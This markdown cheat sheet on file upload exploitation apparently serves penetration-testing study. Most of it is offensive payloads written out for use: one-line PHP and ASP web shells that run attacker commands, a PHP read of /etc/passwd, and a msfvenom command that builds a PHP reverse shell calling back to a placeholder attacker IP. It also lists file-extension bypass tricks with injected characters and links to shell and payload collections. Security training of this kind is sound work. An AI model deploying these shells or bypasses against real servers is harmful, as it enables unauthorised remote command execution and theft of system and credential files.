### Web Shells

```php
<?php file_get_contents('/etc/passwd'); ?>
### Basic PHP File Read

<?php system('hostname'); ?>
### Basic PHP Command Execution

<?php system($_REQUEST['cmd']); ?>
### Basic PHP Web Shell
```

```asp
<% eval request('cmd') %>
### Basic ASP Web Shell
```

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
### Generate PHP reverse shell
```

### Web/Reverse Shells

- **[PHP Web Shell](https://github.com/Arrexel/phpbash)**: Basic web shell for PHP
- [**PHP Reverse Shell**](https://github.com/pentestmonkey/php-reverse-shell): Reverse shell for PHP
- [**Web/Reverse Shells**](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells): List of common web and reverse shells

### Bypasses

```bash
[CTRL+SHIFT+C]
### Client-Side Bypass: Toggle Page Inspector
```

#### Blacklist Bypass

- `shell.phtml` ### Uncommon Extension
- `shell.pHp` ### Case Manipulation

#### Whitelist Bypass

- `shell.jpg.php` ### Double Extension
- `shell.php.jpg` ### Reverse Double Extension
- `%20, %0a, %00, %0d0a, /, .\, ., …` ### Character Injection - Before/After Extension

### Content/Type Bypass

- **[PHP Extensions](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)**: List of PHP extensions
- [ **ASP Extensions**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP): List of ASP extensions
- **[Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)**: List of web extensions
- [**Web Content-Types**](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt): List of web content-types
- **[Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)**: List of all content-types
- [**File Signatures**](https://en.wikipedia.org/wiki/List_of_file_signatures): List of file signatures/magic bytes

### Limited Uploads

| Potential Attack | File Types              |
| ---------------- | ----------------------- |
| XSS              | HTML, JS, SVG, GIF      |
| XXE/SSRF         | XML, SVG, PDF, PPT, DOC |
| DoS              | ZIP, JPG, PNG           |